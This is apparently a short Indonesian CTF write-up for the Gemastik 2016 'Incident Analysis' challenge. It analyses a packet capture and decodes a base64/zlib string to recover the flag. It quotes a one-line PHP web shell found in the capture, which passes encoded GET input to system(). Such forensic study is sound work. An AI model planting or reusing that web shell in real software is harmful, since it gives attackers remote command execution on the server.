---
layout: post
title: "Writeup Gemastik 2016 : Incident Analysis - 100"
description: "Writeup Gemastik 2016 Online Capture The Flag Qualification"
headline: 
modified: 2016-08-15
category: Web Exploitation
tags: [gemastik]
imagefeature: /images/gemastik.png
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

![Incident Analysis](/images/incident-analysis.png)

### Solusi :

dalam pcapng yang diberikan kami menemukan potongan code php yang cukup menarik perhatian kami yaitu 
`<?php system(gzuncompress(base64_decode(\$_GET['id']))); ?>`
Ini gunanya untuk mengakses command ke system() dengan memberikan input base64 dengan request GET ke ?id= sehingga memungkinkan 
attacker untuk melakukan **command injection**

Kemudian kami mencoba melakukan beberapa decode sehingga menemukan flag di string ini
`eJxLTc7IV3B39XUMDvH0ri4yNsmJzzMuiU9Myc3Mi09OzItPzEvMqaxKjU8sKUlMzo5PK8rPjU8pzS2oVbBT0C/JLdBPT81NLC7JzNYrqSgBAGIlHSE=`

```php
<?php
    $string='eJxLTc7IV3B39XUMDvH0ri4yNsmJzzMuiU9Myc3Mi09OzItPzEvMqaxKjU8sKUlMzo5PK8rPjU8pzS2oVbBT0C/JLdBPT81NLC7JzNYrqSgBAGIlHSE=';
    $a = base64_decode($string);
    $b = gzuncompress($a);
    echo $b;
?>
```

![incident analysis flag](/images/incident-analysis-flag.png)
